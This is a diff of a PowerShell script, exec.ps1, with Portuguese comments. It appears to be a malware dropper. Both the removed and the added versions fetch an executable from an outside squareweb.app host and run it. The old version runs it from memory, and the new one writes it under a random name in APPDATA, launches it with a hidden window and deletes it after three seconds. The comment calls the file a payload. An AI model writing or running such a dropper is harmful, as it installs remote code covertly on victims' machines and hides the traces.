@@ -1,21 +1,14 @@
-# exec.ps1 - Executa direto da memória SEM salvar em disco
+# exec.ps1 - Download e execuÃ§Ã£o do payload
 $url = "https://testedessamerda.squareweb.app/programa.exe"
+$path = "$env:APPDATA\$([System.IO.Path]::GetRandomFileName()).exe"
 
-# Baixa para memória e executa
-$data = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+# Download
+(New-Object Net.WebClient).DownloadFile($url, $path)
 
-# Converte para assembly e executa na memória
-$assembly = [System.Reflection.Assembly]::Load($data)
-$entryPoint = $assembly.EntryPoint
+# Executar
+Start-Process -FilePath $path -WindowStyle Hidden
 
-# Se for .NET, executa
-if ($entryPoint) {
-    $entryPoint.Invoke($null, (, [string[]] @()))
-} else {
-    # Se não for .NET, salva temporariamente mas deleta depois
-    $tempFile = [System.IO.Path]::GetTempFileName() + ".exe"
-    [System.IO.File]::WriteAllBytes($tempFile, $data)
-    $process = Start-Process $tempFile -PassThru
-    $process.WaitForExit()
-    Remove-Item $tempFile -Force
-}
+# Aguardar 3 segundos e deletar
+Start-Sleep 3
+Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+
